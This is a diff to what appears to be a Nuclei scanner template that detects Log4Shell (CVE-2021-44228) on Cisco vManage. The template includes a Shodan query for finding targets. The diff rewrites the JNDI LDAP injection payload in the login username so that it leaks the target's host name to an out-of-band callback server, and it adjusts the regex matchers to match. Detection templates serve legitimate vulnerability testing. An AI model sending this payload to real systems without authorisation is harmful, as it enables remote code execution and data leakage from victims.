@@ -15,9 +15,14 @@ info:
     cve-id: CVE-2021-44228
     cwe-id: CWE-77
   metadata:
+    max-request: 1
     shodan-query: title:"vManage"
     verified: "true"
   tags: log4j,cisco,tenable,cve,cve2021,rce,jndi,kev,oast
+
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
 
 http:
   - raw:
@@ -29,7 +34,7 @@ http:
         Origin: {{BaseURL}}
         Referer: {{BaseURL}}
 
-        j_username=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&j_password=admin&submit=Log+In
+        j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&j_password=admin&submit=Log+In
 
     matchers-condition: and
     matchers:
@@ -41,7 +46,7 @@ http:
       - type: regex
         part: interactsh_request
         regex:
-          - '([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+'  # Match for extracted ${sys:os.name} variable
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
       - type: word
         part: body
@@ -55,8 +60,14 @@ http:
 
       - type: regex
         part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print injection point in output
+
+      - type: regex
+        part: interactsh_request
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${sys:os.name} in output
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
 # Enhanced by CS 03/27/2023
